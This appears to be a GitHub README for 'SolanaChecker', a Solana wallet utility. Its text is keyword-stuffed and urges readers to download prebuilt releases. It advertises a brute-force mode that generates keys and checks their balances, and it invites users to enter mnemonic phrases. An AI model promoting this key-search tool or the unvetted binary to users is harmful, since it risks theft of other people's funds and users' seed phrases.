# Key Wallet Generator Private Solana: Securely Create New Wallets

**SolanaChecker** is a tool designed for managing the Solana blockchain, offering multiple functions for checking wallet status, and more. A central feature is a Key Wallet Generator Private Solana, allowing you to create new wallets with unique keys.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/vendor/reveal.webp" />
</p>

## Program Features: Wallet Creation and Security

1.  **Check Solana Address Balance:** Check the current Solana balance.

<p align="left">
    <img src="/vendor/far.webp" />
</p>

2.  **Check Solana Tokens for Fraud:** Assess token security.

<p align="left">
    <img src="/vendor/min.webp" />
</p>

3.  **Track Solana Addresses:** Get notifications via Telegram.

4.  **Wallet Data from Mnemonic Phrase:** Access wallet data.

<p align="left">
    <img src="/vendor/divide.webp" />
</p>

5.  **Generate a Single Solana Wallet (Key Feature):** Generate new wallets.

<p align="left">
    <img src="/vendor/explorer.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance (for Research):** Brute-force.

<p align="left">
    <img src="/vendor/element.webp" />
</p>

## Setting Up Telegram

Configure Telegram.

## Getting Started: Download or Build

Download a pre-compiled build or build the project yourself for security.

## Building the Project

Building the project from source for security reasons.

### Installing Dependencies Using vcpkg:

1.  Install **vcpkg** if you don't have it.
2.  Add vcpkg to your system PATH.
3.  Run the following commands:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Build the project.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Ensure **vcpkg** is integrated.
3.  Click **Build** -> **Build Solution**.
4.  The executable will be in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure dependencies are installed.
2.  Compile using (example):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line: Generating Private Keys

Use these command-line arguments:

1.  **-s / -search**: Brute-force.
2.  **-t / -track (ADDRESS)**: Track.
3.  **-g / -gen (NUMBER)**: *Use this command to generate Solana wallet private keys.* The NUMBER determines the number of wallets to generate.
4.  **-m / -mnemonic (MNEMONIC)**: Show wallet info.
5.  **-b / -balance (ADDRESS)**: Check a balance.

## Notes

-   Use responsibly.
-   Protect your seed phrases.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE).